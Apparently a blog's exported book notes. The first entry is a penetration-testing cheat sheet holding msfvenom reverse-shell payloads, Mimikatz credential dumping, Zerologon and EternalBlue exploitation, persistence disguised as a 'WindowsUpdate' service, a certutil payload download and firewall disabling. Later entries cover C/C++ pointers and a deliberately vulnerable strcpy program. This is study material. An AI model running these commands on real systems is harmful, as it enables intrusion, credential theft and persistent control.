ToolsDirBusterSNETCrackerdirsearchhttps://github.com/maurosoria/dirsearch1&gt; python dirsearch.py -u &lt;Target URL&gt; -e all JWTPyCrackhttps://github.com/Ch1ngg/JWTPyCrack1&gt; python jwtcrack.py -m blasting -s jwt --kf &lt;KeyFile&gt; tgsrepcrack1&gt; python tgsrepcrack.py &lt;Dictionary File&gt; &lt;Ticket File&gt; 3.10 - Post-ExploitationMsfvenomWindows Payload1&gt; msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 lhost=192.168.0.1 port=4444 -f exe -o /tmp/shell.exeEncoded Windows Payload1&gt; msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -i 3 -e x86/shikita_ga_nai lhost=192.168.0.1 port=4444 -f exe -o /tmp/shell.exe Linux Payload1&gt; msfvenom -p linux/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f elf &gt; /tmp/shell.elf macOS Payload1&gt; msfvenom -p osx/x86/shell_reverse_tcp lhost=192.168.0.1 port=4444 -f macho &gt; /tmp/shell.macho PHP Payload1&gt; msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f raw ASP Payload1&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f asp ASPX Payload1&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f aspx JSP Payload1&gt; msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.1 port=4444 -f raw WAR Payload1&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f war Bash Payload1&gt; msfvenom -p cmd/unix/reverse_bash lhost=192.168.0.1 port=4444 -f bash Perl Payload1&gt; msfvenom -p cmd/unix/reverse_perl lhost=192.168.0.1 port=4444 -f raw Python Payload1&gt; msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f raw Mimikatz1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; password.txt 12privilege::debugtoken::elevate 12mimikatz # ts::sessionsmimikatz # ts::remote /id:1 1234567891011# Testing Zerologon Exploitlsadump::zerologon /target:DC.domain.com /account:DC$# Exploit Zerologonlsadump::zerologon /target:DC.domain.com /account:DC$ /exploit# Clear DC password and extract authenticationslsa::dcsync /domain:domain.com /dc:DC.domain.com /user:administrator /authuser:DC$ /authdomain:domain /authpassword:&quot;&quot; /authntlm# Redo clear admin passwordlsadump::postzerologon /trget:domain.com /account:DC$ Chpater.4 - Vulnstack1: Spreading Through Domain’s AccountPersistenceCobalt Strike1beacon&gt; shell sc screate &quot;WindowsUpdate&quot; binpath=&quot;cmd /c start &quot;C:\\Users\\Administrator\\Desktop\\Artificat.exe&quot;&quot;&amp;&amp;sc config &quot;WindowsUpdate&quot; start=auto&amp;&amp;net start WindowsUpdate Chapter.5 - Vulnstack2: Confronting Anti-VirusChapter.6 - Vulnstack3: Obtain DC privilege through PTHDiscovery12345run autorun -s 192.168.93.0/24backgrounduse auxiliary/server/socks_proxyset SRVPORT 6677run Spreading12345use auxiliary/scanner/smb/smb_loginset rhost 192.168.93.30set SMBUSER administratorset PASS_FILE /root/passwd.txtrun 12345use exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhosts 192.168.93.30set smbuser administratorset smbpass 123qwe!ASD 1systeminfo Chapter.7 - Vulnstack4: Docker Escape/Container BreakoutAttack and Exploitation StageAfter getshell:1&gt; find / -name .dockerenv CDK https://github.com/cdk-team/CDK12chmod +x cdk./cdk evaluate --fullSYS_ADMIN1./cdk run mount-disk 123ssh-keygen -t rsals /root/.ssh/cat /root/.ssh/id_rsa.pub DirtyCow https://github/com/firefart/dirtycow 12345unzip dirtycow-master.zipcd dirtycow-mastergcc -pthread dirty.c -o dirty -lcryptchmod +x dirty./dirty 123456 Check if the account firefart exists.1cat /etc/passwd Config intranet proxy with metasploit12ifconfigmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.150.188 LPORT=12345 -f elf &gt; 123456.elf 123456msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.150.188set LPORT 12345run 12chmod +x 12345.elf./12345.elf 1234567meterpreter&gt; routemeterpreter&gt; run autoroute -s 192.168.96.0/24meterpreter&gt; run autoroute -s 192.168.183.0/24meterpreter&gt; backgroundmsf&gt; use auxiliary/server/socks_proxymsf&gt; show optionsmsf&gt; exploit 1234use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset rhost 192.168.183.130run 1run post/windows/gather/smart_hashdump 1234567use exploit/windows/smb/psexecset payload windows/x64/meterpreter/bind_tcpset rhosts 192.168.183.129msf&gt; set SMBUser TESTWIN7-PCmsf&gt; set SMBPassmsf&gt; run Persistence and Recovery Stage1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.210.111 LPROT=17918 -f elf &gt; 17918.elf 1chmod +x 17918.elf 1vim /var/spool/cron/crontabs/root Chapter.8 - Vulnstack5: Using PsExec to Exploit a DC With NO Internet AccessDiscovery and Spreading1certutil.exe -urlcache -split -f http://x.x.x.x/payload.exe 12beacon&gt; shell netsh firewall show statebeacon&gt; shell advfirewall set allprofiles state off Persistence and Recovery1234beacon&gt; shell sc config &quot;windows update&quot; start=autobeacon&gt; shell sc description &quot;windows update&quot; &quot;Windows patch&quot;beacon&gt; shell net start &quot;windows update&quot;beacon&gt; Chapter.9 - Exploiting Zerologon and Obtain DC’s Privilege Chapter.10 - Penetrating Multi-Level Intranet With Different Service Exploitation Chapter.11 - Obtain DC’s Privilege Through SPN","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Blackhat","slug":"Blackhat","permalink":"https://iss4cf0ng.github.io/tags/Blackhat/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"LAN","slug":"LAN","permalink":"https://iss4cf0ng.github.io/tags/LAN/"},{"name":"Domain","slug":"Domain","permalink":"https://iss4cf0ng.github.io/tags/Domain/"},{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"Pentest","slug":"Pentest","permalink":"https://iss4cf0ng.github.io/tags/Pentest/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Web Security From White Hat (Second Edition)","slug":"2026-1-2-NoteWebSecurityFromWhiteHat","date":"2026-01-02T15:34:39.000Z","updated":"2026-01-09T12:26:19.119Z","comments":true,"path":"2026/01/02/2026-1-2-NoteWebSecurityFromWhiteHat/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWebSecurityFromWhiteHat/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Web Security From White Hat (Second Edition)”.The content will be continuously updated as I read through the book. ReflectionChapter.2 - HTTP And Web ApplicationChapter.3 - Browser SecurityChapter.4 - Cookie And Session SecurityChapter.5 -Chapter.6 - XSSChapter.7 - CSRFChapter.8 - Click HijackingChapter.9 - Mobile Web SecurityChapter.10 - Injection AttackChapter.11 - File ModifyingChapter.12 - SSRFChapter.13 - AuthenticationChapter.14 - Access ControlChapter.15 - CryptographyChapter.16 - API SecurityChapter.17 - Logical SecurityChapter.18 - Language SecurityChapter.19 - Server Side Safe ConfigurationChapter.20 - Proxy And CDN SecurityChapter.21 - Denial Of Service Of Application LevelChapter.22 - WebSpider","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"Pentest","slug":"Pentest","permalink":"https://iss4cf0ng.github.io/tags/Pentest/"},{"name":"WebSecurity","slug":"WebSecurity","permalink":"https://iss4cf0ng.github.io/tags/WebSecurity/"},{"name":"Security","slug":"Security","permalink":"https://iss4cf0ng.github.io/tags/Security/"},{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"https://iss4cf0ng.github.io/tags/CyberSecurity/"},{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"PHP","slug":"PHP","permalink":"https://iss4cf0ng.github.io/tags/PHP/"},{"name":"ASP","slug":"ASP","permalink":"https://iss4cf0ng.github.io/tags/ASP/"},{"name":"ASPX","slug":"ASPX","permalink":"https://iss4cf0ng.github.io/tags/ASPX/"},{"name":"JSP","slug":"JSP","permalink":"https://iss4cf0ng.github.io/tags/JSP/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Mastering C/C++ Pointer","slug":"2026-1-2-NoteMasteringCppPointer","date":"2026-01-02T15:33:35.000Z","updated":"2026-01-12T17:42:09.758Z","comments":true,"path":"2026/01/02/2026-1-2-NoteMasteringCppPointer/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteMasteringCppPointer/","excerpt":"","text":"El libro # Introduction This article is used to keep notes and summaries of the book \"Mastering C/C++ Pointer\". The content will be continuously updated as I read through the book. Java and Python **DO NOT SUPPORT** pointer. However, this book introduces a similar concept——*reference*. C# supports pointer, but developers have to enable **unsafe mode**. # Reflection Finally I completed this book! Before starting this book, you should have a fundamental knowledge of C and C++. Basic knowledge such as data types, arrays, iteration, functions, and `iostream` is required. Althrough this book covers the concept of **references** in Java, C# and Python, these are not the main focus if your goal is to study pointers. Pointers are an essential part of C and significant part of C++. This book also cover a bit of `operator` in C++. Learning C without understanding pointers only shows that you have been exposed to C. On the other hand, knowing how to use pointers **DOES NOT** necessarily mean that you know C++. Part I - C LanguageChapter.1 - Fundamental1.1 - Variable123456789101112131415#include &lt;stdio.h&gt;int main()&#123; int x = 100, y = 200, z = 300; printf(&quot;Address of x: %p\\n&quot;, &amp;x); printf(&quot;Address of y: %p\\n&quot;, &amp;y); printf(&quot;Address of z: %p\\n&quot;, &amp;z); printf(&quot;Value of x: %d\\n&quot;, x); printf(&quot;Value of y: %d\\n&quot;, y); printf(&quot;Value of z: %d\\n&quot;, z); return 0;&#125; Output:123456Address of x: 0x7ffdf75f71ecAddress of y: 0x7ffdf75f71e8Address of z: 0x7ffdf75f71e4Value of x: 100Value of y: 200Value of z: 300 1.2 - 1 Dimension123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int main()&#123; int x[5]; int i; for (i = 0; i &lt; 5; i++) &#123; printf(&quot;Enter x[%d]: &quot;, i); scanf(&quot;%d&quot;, &amp;x[i]); &#125; for (i = 0; i &lt; 5; i++) &#123; printf(&quot;x[%d] = %d\\n&quot;, i, x[i]); &#125; printf(&quot;\\n&quot;); for (i = 0; i &lt; 5; i++) &#123; printf(&quot;Enter x[%d]: &quot;, i); scanf(&quot;%d&quot;, x + i); &#125; for (i = 0; i &lt; 5; i++) &#123; printf(&quot;x[%d] = %d\\n&quot;, i, x + i); &#125; for (i = 0; i &lt; 5; i++) &#123; printf(&quot;x[%d] = %d\\n&quot;, i, x[i]); &#125; return 0;&#125; Output:1234567891011121314151617181920212223242526Enter x[0]: 10Enter x[1]: 20Enter x[2]: 30Enter x[3]: 40Enter x[4]: 50x[0] = 10x[1] = 20x[2] = 30x[3] = 40x[4] = 50Enter x[0]: 50Enter x[1]: 40Enter x[2]: 30Enter x[3]: 20Enter x[4]: 10x[0] = -1653994464x[1] = -1653994460x[2] = -1653994456x[3] = -1653994452x[4] = -1653994448x[0] = 50x[1] = 40x[2] = 30x[3] = 20x[4] = 10 12345678910111213141516171819202122#include &lt;stdio.h&gt;int main()&#123; int x[5] = &#123;10, 20, 30, 40, 50&#125;; int i; for (i = 0; i &lt; 5; i++) printf(&quot;&amp;x[%d] = %p\\n&quot;, i, &amp;x[i]); printf(&quot;\\n&quot;); for (i = 0; i &lt; 5; i++) printf(&quot;x+%d = %p\\n&quot;, i, x+i); printf(&quot;\\n&quot;); for (i = 0; i &lt; 5; i++) printf(&quot;x[%d] = %d\\n&quot;, i, x[i]); getchar(); return 0;&#125; Output:1234567891011121314151617&amp;x[0] = 0x7fff5863ac80&amp;x[1] = 0x7fff5863ac84&amp;x[2] = 0x7fff5863ac88&amp;x[3] = 0x7fff5863ac8c&amp;x[4] = 0x7fff5863ac90x+0 = 0x7fff5863ac80x+1 = 0x7fff5863ac84x+2 = 0x7fff5863ac88x+3 = 0x7fff5863ac8cx+4 = 0x7fff5863ac90x[0] = 10x[1] = 20x[2] = 30x[3] = 40x[4] = 50 1.3 - 2 Dimension1.4 - StructureChapter.2 - Pointer And Variable2.1 - One Pointer: One Key123456789101112131415161718192021#include &lt;stdio.h&gt;int main()&#123; int x = 100, y = 200; int *ptr = &amp;x; printf(&quot;Address of x: %p, value: %d\\n&quot;, &amp;x, x); printf(&quot;Address of y: %p, value: %d\\n&quot;, &amp;y, y); printf(&quot;Address of ptr: %p\\n\\n&quot;, &amp;ptr); printf(&quot;Content of ptr: %p\\n&quot;, ptr); printf(&quot;x = %d, *ptr = %d\\n\\n&quot;, x, *ptr); ptr = &amp;y; printf(&quot;Content of ptr: %p\\n&quot;, ptr); printf(&quot;y = %d, *ptr = %d\\n&quot;, y, *ptr); getchar(); return 0;&#125; Output:123456789Address of x: 0x7ffd8b7738ec, value: 100Address of y: 0x7ffd8b7738e8, value: 200Address of ptr: 0x7ffd8b7738e0Content of ptr: 0x7ffd8b7738ecx = 100, *ptr = 100Content of ptr: 0x7ffd8b7738e8y = 200, *ptr = 200 2.2 - Two Pointer: Two Key12345678910111213141516171819#include &lt;stdio.h&gt;int main()&#123; int x = 100; int *p1 = &amp;x; int **p2 = &amp;p1; //int p3 = &amp;x; Compile error. //int *p4 = &amp;p1; Compile error. printf(&quot;&amp;x = %p\\n&quot;, &amp;x); printf(&quot;&amp;p1 = %p, p1 = %p\\n&quot;, &amp;p1, p1); printf(&quot;&amp;p2 = %p, p2 = %p\\n&quot;, &amp;p2, p2); printf(&quot;**p2 = %d, *p1 = %d\\n&quot;, **p2, *p1); return 0;&#125; Output:1234&amp;x = 0x7ffd77ac28fc&amp;p1 = 0x7ffd77ac28f0, p1 = 0x7ffd77ac28fc&amp;p2 = 0x7ffd77ac28e8, p2 = 0x7ffd77ac28f0**p2 = 100, *p1 = 100 2.3 - Three Pointer: Three Key123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; int x = 100; int *p1 = &amp;x; int **p2 = &amp;p1; int ***p3 = &amp;p2; printf(&quot;&amp;x = %p\\n&quot;, &amp;x); printf(&quot;&amp;p1 = %p, p1 = %p\\n&quot;, &amp;p1, p1); printf(&quot;&amp;p2 = %p, p2 = %p\\n&quot;, &amp;p2, p2); printf(&quot;&amp;p3 = %p, p3 = %p\\n\\n&quot;, &amp;p3, p3); printf(&quot;***p3 = %d, **p2 = %d, *p1 = %d\\n&quot;, ***p3, **p2, *p1); return 0;&#125; Output:123456&amp;x = 0x7ffcdac5f87c&amp;p1 = 0x7ffcdac5f870, p1 = 0x7ffcdac5f87c&amp;p2 = 0x7ffcdac5f868, p2 = 0x7ffcdac5f870&amp;p3 = 0x7ffcdac5f860, p3 = 0x7ffcdac5f868***p3 = 100, **p2 = 100, *p1 = 100 2.4 - Pointer And const123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int main()&#123; int a = 100, b = 200; const int *p = &amp;a; int *const q = &amp;b; printf(&quot;a = %d, *p = %d\\n&quot;, a, *p); printf(&quot;b = %d, *q = %d\\n&quot;, b, *q); /* NO! *p = b; */ /* OK */ p = &amp;b; printf(&quot;*p = %d\\n&quot;, *p); /*-------------*/ /*NO! q = &amp;a; */ /* OK */ *q = 888; return 0;&#125; Output:123a = 100, *p = 100b = 200, *q = 200*p = 200Another case: Both actions are not allowed.1const int * const p = &amp;a; Chapter.3 - Pointer and Array3.1 - One Dimension Array123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int main()&#123; int arr[] = &#123;100, 101, 102&#125;; int *ptr = arr; int i, size = 0; size = (sizeof(arr)/sizeof(arr[0])); //-----------Using arr-----------\\\\ printf(&quot;arr pointer:\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;&amp;arr[%d] = %x\\n&quot;, i, &amp;arr[i]); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;arr+%d = %x\\n&quot;, i, arr + i); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;arr[%d] = %d\\n&quot;, i, arr[i]); //-----------Using ptr-----------\\\\ printf(&quot;\\nUsing ptr:\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;*(arr+%d) = %d\\n&quot;, i, ptr + i); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;ptr[%d] = %d\\n&quot;, i, ptr[i]); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;*(ptr+%d) = %d\\n&quot;, i, *(ptr+i)); return 0;&#125; Output:123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int main()&#123; int arr[] = &#123;100, 101, 102&#125;; int *ptr = arr; int i, size = 0; size = (sizeof(arr)/sizeof(arr[0])); //-----------Using arr-----------\\\\ printf(&quot;arr pointer:\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;&amp;arr[%d] = %x\\n&quot;, i, &amp;arr[i]); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;arr+%d = %x\\n&quot;, i, arr + i); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;arr[%d] = %d\\n&quot;, i, arr[i]); //-----------Using ptr-----------\\\\ printf(&quot;\\nUsing ptr:\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;*(arr+%d) = %d\\n&quot;, i, ptr + i); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;ptr[%d] = %d\\n&quot;, i, ptr[i]); printf(&quot;\\n&quot;); for (i = 0; i &lt; size; i++) printf(&quot;*(ptr+%d) = %d\\n&quot;, i, *(ptr+i)); return 0;&#125; Chapter.4 - Pointer And Function4.2 - swap4.4 - Pointer To Function123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;int add(int, int);int substract(int, int);int multiply(int, int);int divide(int, int);int (*operation)(int, int);int main()&#123; int x, y, output; printf(&quot;Enter x and y: &quot;); scanf(&quot;%d %d&quot;, &amp;x, &amp;y); operation = add; output = (*operation)(x, y); printf(&quot;%d + %d = %d\\n&quot;, x, y, output); operation = substract; output = (*operation)(x, y); printf(&quot;%d - %d = %d\\n&quot;, x, y, output); operation = multiply; output = (*operation)(x, y); printf(&quot;%d * %d = %d\\n&quot;, x, y, output); operation = divide; output = (*operation)(x, y); printf(&quot;%d / %d = %d\\n&quot;, x, y, output); return 0;&#125;int add(int a, int b)&#123; return a + b;&#125;int substract(int a, int b)&#123; return a - b;&#125;int multiply(int a, int b)&#123; return a * b;&#125;int divide(int a, int b)&#123; return a / b;&#125; Output:12345Enter x and y: 10 210 + 2 = 1210 - 2 = 810 * 2 = 2010 / 2 = 5 4.5 - Function Returns a Pointer1 Chapter.5 - Pointer And StringChapter.6 - Pointer And StructChapter.7 - Linked ListChapter.8 - BSTChapter.9 - Pointer And FilePart II - C++Chapter.10 - Reference10.1 - Variable and ReferenceIn C, there are only pointers; it does not have the concept of reference like C++.123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;int main()&#123; int k = 100; int &amp;r = k; int *p = &amp;k; cout &lt;&lt; &quot;&amp;k=&quot; &lt;&lt; &amp;k &lt;&lt; endl; cout &lt;&lt; &quot;&amp;r=&quot; &lt;&lt; &amp;r &lt;&lt; endl; cout &lt;&lt; &quot;&amp;p=&quot; &lt;&lt; &amp;p &lt;&lt; endl; cout &lt;&lt; &quot;p=&quot; &lt;&lt; p &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl; cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl; cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl; r++; cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl; cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl; cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl; k++; cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl; cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl; cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl; return 0;&#125;Output:12345678910111213141516&amp;k=0x7ffd0d5ca174&amp;r=0x7ffd0d5ca174&amp;p=0x7ffd0d5ca168p=0x7ffd0d5ca174k=100r=100*p=100k=101r=101*p=101k=102r=102*p=102 10.2 - swapIn C, we implement swap() with pointers. In C++, we are allowed to implement it with reference:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;using namespace std;void swap_by_address(int *x, int *y);void swap_by_reference(int &amp;, int &amp;y);void swap_by_value(int, int); //Just for demonstration, this method cannot do swapping!int main()&#123; int x = 100, y = 200; //Call by address x = 100; y = 200; cout &lt;&lt; &quot;Call by value&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl; swap_by_value(x, y); cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl; //Call by address x = 100; y = 200; cout &lt;&lt; &quot;Call by address&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl; swap_by_address(&amp;x, &amp;y); cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl; //Call by reference x = 100; y = 200; cout &lt;&lt; &quot;Call by reference&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl; swap_by_reference(x, y); cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl; return 0;&#125;void swap_by_value(int a, int b)&#123; int temp; temp = a; a = b; b = temp;&#125;void swap_by_address(int *a, int *b)&#123; int temp; temp = *a; *a = *b; *b = temp;&#125;void swap_by_reference(int &amp;a, int &amp;b)&#123; int temp; temp = a; a = b; b = temp;&#125;Output:1234567891011121314151617Call by valueBefore swapping...x=100, y=200After swapping...x=100, y=200Call by addressBefore swapping...x=100, y=200After swapping...x=200, y=100Call by referenceBefore swapping...x=100, y=200After swapping...x=200, y=100 Chapter.11 - this PointerChapter.12 - new and delete12.1 - new, delete and variable12345678910111213using namespace std;int main()&#123; int *p = (int *)malloc(sizeof(int)); //int *p = new int; *p = 200; cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl; delete p; return 0;&#125; Output: 1*p=200You CANNOT do this:12345678910111213#include &lt;iostream&gt;using namespace std;int main()&#123; int k = 100; int *p = &amp;k; cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl; delete p; return 0;&#125;Output:123456789main.cpp: In function ‘int main()’:main.cpp:18:12: warning: ‘void operator delete(void*)’ called on unallocated object ‘k’ [-Wfree-nonheap-object] 18 | delete p; | ^main.cpp:15:9: note: declared here 15 | int k = 100; | ^*p=100free(): invalid pointerSince the variable k is in stack, rather than heap. 12.2 - new, delete and ArrayChapter.13 - copy ConstructorChapter.14 - Virtual Function, Pointer And ReferenceChapter.15 - Linked ListPart III - JavaPart IV - CPart V - Python","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"C++","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Python","slug":"Python","permalink":"https://iss4cf0ng.github.io/tags/Python/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"},{"name":"C","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Java","slug":"Java","permalink":"https://iss4cf0ng.github.io/tags/Java/"},{"name":"Pointer","slug":"Pointer","permalink":"https://iss4cf0ng.github.io/tags/Pointer/"},{"name":"Reference","slug":"Reference","permalink":"https://iss4cf0ng.github.io/tags/Reference/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Windows Security Practice - Buffer Overflow","slug":"2026-1-2-NoteWindowsBufferOverflow","date":"2026-01-02T15:30:38.000Z","updated":"2026-01-25T15:54:56.017Z","comments":true,"path":"2026/01/02/2026-1-2-NoteWindowsBufferOverflow/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Windows Security Practice - Buffer Overflow”.The content will be continuously updated as I read through the book. ReflectionFinally, I have completed this book. I had wanted to read through it for a long time, but I was unable to do so for personal reasons. After reading the book Reverse Engineering Core (리버스 엔지니어링 핵심 원리) Click Me!, I now have a deeper understanding of buffer overflows and the PE file format. This book is recommended for those who want to study Windows buffer overflow techniques. I suggest that readers have a fundamental understanding of assembly language, C/C++, and reverse engineering. There are some typos in this book. In addition, some practical exploitation experiments are difficult to replicate, as it is hard to find the vulnerable applications online (some of the URLs are no longer valid). However, if you want to learn buffer overflow techniques—from Windows XP to Windows 10, and from applications without any protections to those with ASLR and DEP—this book is still suitable for you. Chapter 1 - Set Up1.1 - VM and Windos XP SP31.2 - ToolsDev-C++According to the author, Dev-C++ is not recommended for software development. However, it is recommended for learning buffer overflow, as it produces executables with simpler structures. https://sourceforge.net/projects/orwelldevcpp/ Visual C++ 2010 ExpressVisual C++ 2013 ExpressNASMNASM stands for The Netwide Assembler. OllyDbgWinDbgImmunity DebuggerCFF ExplorerHxDProcess ExplorerMetasploitChapter 2 - Change the Procedure of a Program2.2 - Change the Procedure of a Program via Buffer Overflow1234567891011121314151617181920//File name: simplec001.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func(char *str) &#123; char buffer[24]; int *ret; strcpy(buffer, str);&#125;int main(int argc, char** argv) &#123; int x = 0; x = 0; func(argv[1]); x = 1; printf(&quot;x is 1\\n&quot;); printf(&quot;x is 0\\n&quot;); system(&quot;pause&quot;);&#125; 2.3 - Debugging with OllyDbg 123&gt; gdb --args SimpleC001.exe meaningless(gdb) disassemble func(gdb) disassemble main EAX: Accumulator Register ECX: Counter Register EDX: Data Register EBX: Base Register ESP: Stack Pointer EBP: Base Register ESI: Source Index EDI: Destination Index EIP: Instruction Pointer Here “E” stands for Extended. Modifying the address: \\begin{align*} 0x00401548 + 0x00000014 = 0x0040155C \\end{align*}1*((int*)(buffer+0x20+0x4)) += 0x14; Notice that the value 0x14 and 0x20 are depend on your OS. 2.4 - Basic Buffer OverflowCode (You may remove system(&quot;pause&quot;);):1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func(char *str) &#123; char buffer[24]; int *ret; strcpy(buffer, str);&#125;int main(int argc, char** argv) &#123; int x = 0; x = 0; func(argv[1]); x = 1; printf(&quot;x is 1\\n&quot;); printf(&quot;x is 0\\n&quot;);&#125;Don’t forget to recompile your code. Now we need to cause the program to crash. Before doing so, we need to configure OllyDbg: Here, we input 48 characters of ‘A’ and then execute the program. As a result, the program is crashed: Notice the hexadecimal representation of letter A is 0x41. From the register window of 